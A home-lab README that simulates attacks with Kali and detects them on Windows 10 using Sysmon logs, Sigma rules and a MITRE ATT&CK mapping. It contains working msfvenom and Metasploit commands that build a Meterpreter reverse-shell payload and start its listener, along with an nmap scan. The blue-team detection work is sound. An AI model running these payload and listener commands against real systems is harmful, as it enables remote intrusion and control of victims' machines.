# 🛡️ SOC Home Lab — Attack Detection with Sysmon

A home lab simulating real-world cyberattacks and blue team detection using Kali Linux and Windows 10 with Sysmon.

---

## 🧪 Lab Architecture

```
┌─────────────────────┐         ┌─────────────────────┐
│   Kali Linux        │◄───────►│   Windows 10        │
│   (Attacker)        │  Network│   (Victim)          │
│                     │         │   + Sysmon           │
│  - Nmap             │         │                     │
│  - Metasploit       │         │  - Event Viewer     │
│  - MSFvenom         │         │  - Sysmon Logs      │
└─────────────────────┘         └─────────────────────┘
```

> Both machines run on the same local network (e.g., VMware / VirtualBox host-only or NAT network)

---

## ⚔️ Attack Scenarios

### Scenario 1 — Network Reconnaissance (Nmap Scan)

**Tool:** Nmap  
**Goal:** Discover open ports on the victim machine

```bash
nmap -sV -O <victim-ip>
```

**What Sysmon detects:**
- `Event ID 3` — Network connections from the attacker IP

---

### Scenario 2 — Reverse Shell Payload (MSFvenom + Metasploit)

**Step 1 — Generate payload on Kali:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<kali-ip> LPORT=4444 \
  -f exe -o payload.exe
```

**Step 2 — Start listener on Kali:**
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <kali-ip>
set LPORT 4444
run
```

**Step 3 — Execute payload on victim (simulate user running malicious file)**

---

## 🔍 Detection — Sysmon Log Analysis

### How to View Logs (Windows 10 Victim)

```
Win + R → eventvwr → Enter
→ Applications and Services Logs
  → Microsoft → Windows → Sysmon → Operational
```

Click **"Filter Current Log"** and filter by Event ID.

---

### Key Sysmon Events Detected

| Event ID | Name | What It Captures |
|----------|------|-----------------|
| **1** | Process Create | `payload.exe` execution — shows image path, parent process, command line |
| **3** | Network Connection | Reverse TCP callback to Kali IP:4444 |
| **7** | Image Load | DLLs loaded by the malicious process |
| **8** | CreateRemoteThread | Meterpreter injecting into another process |
| **10** | Process Access | Potential LSASS access (credential theft) |
| **11** | File Create | Files dropped by the payload |

---

### Event ID 1 — What a Malicious Process Create Looks Like

```
EventID:     1
Image:       C:\Users\User\Downloads\payload.exe
ParentImage: C:\Windows\explorer.exe
CommandLine: payload.exe
User:        DESKTOP\User
Hashes:      SHA256=<hash>
```

🚨 **Red flags:**
- Executable running from `Downloads`, `Temp`, or `AppData`
- Unusual parent process (e.g., Word spawning cmd.exe)
- No version info or signature

---

### Event ID 3 — What a Reverse Shell Connection Looks Like

```
EventID:          3
Image:            C:\Users\User\Downloads\payload.exe
DestinationIp:    <kali-ip>
DestinationPort:  4444
Protocol:         tcp
Initiated:        true
```

🚨 **Red flags:**
- Unknown process making outbound connections
- Connecting to non-standard ports (4444, 4445, 1337, etc.)
- No legitimate business reason for the connection

---

### Event ID 8 — Process Injection (Meterpreter)

```
EventID:          8
SourceImage:      C:\Users\User\Downloads\payload.exe
TargetImage:      C:\Windows\System32\notepad.exe
StartAddress:     0x...
```

🚨 **Red flags:**
- Unknown process injecting into legitimate Windows processes
- Common targets: `explorer.exe`, `notepad.exe`, `svchost.exe`

---

## 🛡️ Detection Rules

### Sigma Rule — Suspicious Executable from Downloads Folder

```yaml
title: Executable Launched from Downloads Directory
status: experimental
description: Detects process creation from user Downloads folder — common malware delivery path
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    EventID: 1
    Image|contains: '\Downloads\'
    Image|endswith: '.exe'
  condition: selection
falsepositives:
  - Legitimate installers run by user
level: medium
tags:
  - attack.execution
  - attack.t1204.002
```

---

### Sigma Rule — Reverse Shell Network Connection

```yaml
title: Suspicious Outbound Connection on Non-Standard Port
status: experimental
description: Detects outbound TCP connections to non-standard ports from suspicious processes
logsource:
  product: windows
  category: network_connection
detection:
  selection:
    EventID: 3
    Initiated: 'true'
    DestinationPort|contains:
      - '4444'
      - '4445'
      - '1337'
      - '9001'
  condition: selection
falsepositives:
  - Custom legitimate applications
level: high
tags:
  - attack.command_and_control
  - attack.t1571
```

---

## 🗺️ MITRE ATT&CK Mapping

| Technique | ID | What Happened |
|-----------|----|---------------|
| Phishing / User Execution | T1204.002 | User ran payload.exe |
| Command and Control | T1571 | Reverse TCP on port 4444 |
| Process Injection | T1055 | Meterpreter injected into process |
| Network Scanning | T1046 | Nmap port scan |

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| Kali Linux | Attacker machine |
| Windows 10 | Victim machine |
| Sysmon | Endpoint telemetry |
| Nmap | Network reconnaissance |
| Metasploit / MSFvenom | Payload generation & exploitation |
| Windows Event Viewer | Log analysis |

---

## 📈 Roadmap

- [ ] Add SIEM (Wazuh or Splunk) for centralized log management
- [ ] Forward Sysmon logs with Winlogbeat → Elastic Stack
- [ ] Simulate credential dumping with Mimikatz
- [ ] Add persistence techniques (registry run keys, scheduled tasks)
- [ ] Build a full incident response report

---

## 👤 Author

**Oussama Zehri**  
Cybersecurity enthusiast | SOC Analyst in training  
[LinkedIn](#) • [GitHub](#)

---

> ⚠️ This lab is for educational purposes only. All attacks were performed in an isolated lab environment.
